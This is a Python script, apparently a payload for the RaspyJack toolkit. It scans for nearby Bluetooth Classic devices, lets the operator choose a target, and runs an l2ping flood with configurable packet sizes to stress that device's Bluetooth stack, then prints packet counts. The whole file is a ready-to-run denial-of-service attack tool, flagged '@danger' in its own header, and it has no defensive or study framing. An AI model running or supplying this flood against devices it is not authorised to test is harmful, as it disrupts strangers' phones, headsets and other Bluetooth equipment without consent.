#!/usr/bin/env python3
# @name: Bluetooth L2CAP Ping Flood
# @desc: Scan for Bluetooth Classic devices, select a target, and send continuous L2CAP ping requests to stress the target's Bluetooth stack.
# @category: bluetooth
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Bluetooth L2CAP Ping Flood
================================================
Author: 7h30th3r0n3

Scan for Bluetooth Classic devices, select a target, and send continuous
L2CAP ping requests to stress the target's Bluetooth stack.  Uses
l2ping with configurable packet size.

Setup / Prerequisites
---------------------
- Bluetooth adapter (hci0)
- apt install bluez (provides l2ping)

Controls
--------
  python3 bt_dos.py [target_mac] [packet_size]

    target_mac   -- optional Bluetooth Classic MAC address
                     (AA:BB:CC:DD:EE:FF) to flood directly. If omitted,
                     a scan runs and you pick a target from a numbered
                     list.
    packet_size  -- optional L2CAP payload size in bytes, one of
                     200, 400, 600, 900 (default: 600).

  If more than one Bluetooth adapter is present, you'll be prompted to
  pick one from a numbered list.

  Ctrl-C        -- stop the flood and print a summary
"""

from payloads._web_input import request_input
import os
import sys
import time
import re
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_bt_interfaces

# ── Constants ────────────────────────────────────────────────────────────────
HCI_DEV = None  # set in main() via _select_bt_interface()
PACKET_SIZES = [200, 400, 600, 900]

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
devices = []          # [{addr, name}]
target_addr = ""
flooding = False
flood_proc = None
packets_sent = 0
packets_recv = 0
pkt_size_idx = 2      # default: 600
status_msg = "Idle"
_scan_active = False


# ── HCI helpers ──────────────────────────────────────────────────────────────

def _hci_up():
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


# ── Scan for BT Classic devices (bluetoothctl) ────────────────────────────────

def _scan_devices():
    """Scan for BT Classic devices using bluetoothctl."""
    global status_msg, _scan_active

    with lock:
        _scan_active = True
        status_msg = "Scanning..."

    _hci_up()
    found = []

    try:
        # Start bluetoothctl scan
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(
            input="power on\nscan on\n",
            timeout=12,
        )
    except (subprocess.TimeoutExpired, Exception):
        try:
            proc.kill()
        except Exception:
            pass

    time.sleep(0.5)

    # Collect discovered devices
    try:
        result = subprocess.run(
            ["bluetoothctl", "devices"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            match = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s+(.*)", line)
            if match:
                addr = match.group(1).upper()
                name = match.group(2).strip() or "(unknown)"
                found.append({"addr": addr, "name": name})
    except Exception as exc:
        with lock:
            status_msg = str(exc)[:20]

    # Stop scanning
    try:
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        proc.communicate(input="scan off\nquit\n", timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass

    with lock:
        devices.clear()
        devices.extend(found)
        status_msg = f"Found {len(found)} devices"
        _scan_active = False


# ── L2CAP flood thread ──────────────────────────────────────────────────────

def _flood_loop():
    """Run l2ping in flood mode against the target."""
    global flood_proc, packets_sent, packets_recv, status_msg, flooding

    with lock:
        addr = target_addr
        size = PACKET_SIZES[pkt_size_idx]

    if not addr:
        with lock:
            status_msg = "No target"
            flooding = False
        return

    _hci_up()

    with lock:
        status_msg = f"Flooding {addr[-8:]}"
        packets_sent = 0
        packets_recv = 0

    try:
        proc = subprocess.Popen(
            ["sudo", "l2ping", "-i", HCI_DEV,
             "-s", str(size), "-f", addr],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        with lock:
            flood_proc = proc

        for line in proc.stdout:
            with lock:
                if not flooding:
                    break

            line = line.strip()
            # Typical output: "44 bytes from AA:BB:CC:DD:EE:FF id 123 time 5.42ms"
            if "bytes from" in line:
                with lock:
                    packets_sent += 1
                    packets_recv += 1
            elif "Sent" in line or "ping" in line.lower():
                with lock:
                    packets_sent += 1

        proc.wait(timeout=3)

    except Exception as exc:
        with lock:
            status_msg = f"Err: {str(exc)[:16]}"
    finally:
        with lock:
            p = flood_proc
            flood_proc = None
        if p:
            try:
                p.terminate()
                p.wait(timeout=3)
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass
        with lock:
            flooding = False
            if not status_msg.startswith("Err"):
                status_msg = "Flood stopped"


# ── Start / stop flood ──────────────────────────────────────────────────────

def _start_flood(addr):
    global target_addr, flooding
    with lock:
        if flooding:
            return
        target_addr = addr
        flooding = True
    threading.Thread(target=_flood_loop, daemon=True).start()


def _stop_flood():
    global flooding, status_msg
    with lock:
        flooding = False
        p = flood_proc
        status_msg = "Stopping..."
    if p:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    with lock:
        status_msg = "Stopped"


# ── Bluetooth adapter selection ─────────────────────────────────────────────

def _select_bt_interface():
    """Detect BT interfaces and pick one. Prompts if more than one is found."""
    ifaces = list_bt_interfaces()

    if not ifaces:
        print("No Bluetooth adapter found.", flush=True)
        return None

    if len(ifaces) == 1:
        chosen = ifaces[0]
        if not chosen["is_up"]:
            subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                           capture_output=True, timeout=5)
        return chosen["name"]

    print("Multiple Bluetooth adapters found:", flush=True)
    for i, ifc in enumerate(ifaces):
        mac = ifc["mac"] or "?"
        state = "UP" if ifc["is_up"] else "DOWN"
        print(f"  [{i}] {ifc['name']}  {ifc['bus'] or '?'}  {mac}  {state}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth adapter", input_type="select", choices=[
            {"value": str(i), "label": f"{item['name']} · {item.get('bus') or 'unknown'} · {item.get('mac') or 'no address'} · {'UP' if item.get('is_up') else 'DOWN'}"}
            for i, item in enumerate(ifaces)]))
        if choice.isdigit() and 0 <= int(choice) < len(ifaces):
            chosen = ifaces[int(choice)]
            if not chosen["is_up"]:
                subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                               capture_output=True, timeout=5)
            return chosen["name"]
        print("Invalid selection, try again.", flush=True)


# ── Target selection ─────────────────────────────────────────────────────────

def _select_target():
    """Scan for BT Classic devices and let the operator pick one by number."""
    print("Scanning for Bluetooth Classic devices...", flush=True)
    _scan_devices()

    with lock:
        devs = list(devices)
        msg = status_msg

    print(msg, flush=True)
    if not devs:
        return None

    for i, dev in enumerate(devs):
        print(f"  [{i}] {dev['addr']}  {dev['name']}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth target", input_type="select", choices=[
            {"value": str(i), "label": f"{item.get('name') or 'unknown'} · {item.get('addr') or 'no address'}"}
            for i, item in enumerate(devs)]))
        if choice.isdigit() and 0 <= int(choice) < len(devs):
            return devs[int(choice)]["addr"]
        print("Invalid selection, try again.", flush=True)


# ── Main ─────────────────────────────────────────────────────────────────────

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [target_mac] [packet_size]", flush=True)
    print(f"  target_mac   Bluetooth Classic MAC, e.g. AA:BB:CC:DD:EE:FF "
          f"(optional; omit to scan and pick a target)", flush=True)
    print(f"  packet_size  one of: {', '.join(str(s) for s in PACKET_SIZES)} "
          f"(default: {PACKET_SIZES[pkt_size_idx]})", flush=True)


_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def main():
    global pkt_size_idx, HCI_DEV

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    target = None
    size = PACKET_SIZES[pkt_size_idx]
    rest = args

    if args and _MAC_RE.match(args[0]):
        target = args[0].upper()
        rest = args[1:]

    if rest:
        try:
            size = int(rest[0])
        except ValueError:
            _usage()
            return 1
        if size not in PACKET_SIZES:
            _usage()
            return 1

    pkt_size_idx = PACKET_SIZES.index(size)

    HCI_DEV = _select_bt_interface()
    if not HCI_DEV:
        return 1

    if not target:
        target = _select_target()
        if not target:
            print("No target selected. Exiting.", flush=True)
            return 1

    print(f"Target: {target}  Packet size: {size}B", flush=True)
    _start_flood(target)

    try:
        while True:
            time.sleep(1.0)
            with lock:
                active = flooding
                sent = packets_sent
                recv = packets_recv
                msg = status_msg
            if not active:
                print(msg, flush=True)
                break
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"[{ts}] {msg}  sent={sent} recv={recv}", flush=True)
    except KeyboardInterrupt:
        print("\nStopping flood...", flush=True)
        _stop_flood()

    with lock:
        sent = packets_sent
        recv = packets_recv

    print(f"Summary: target={target} size={size}B sent={sent} recv={recv}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
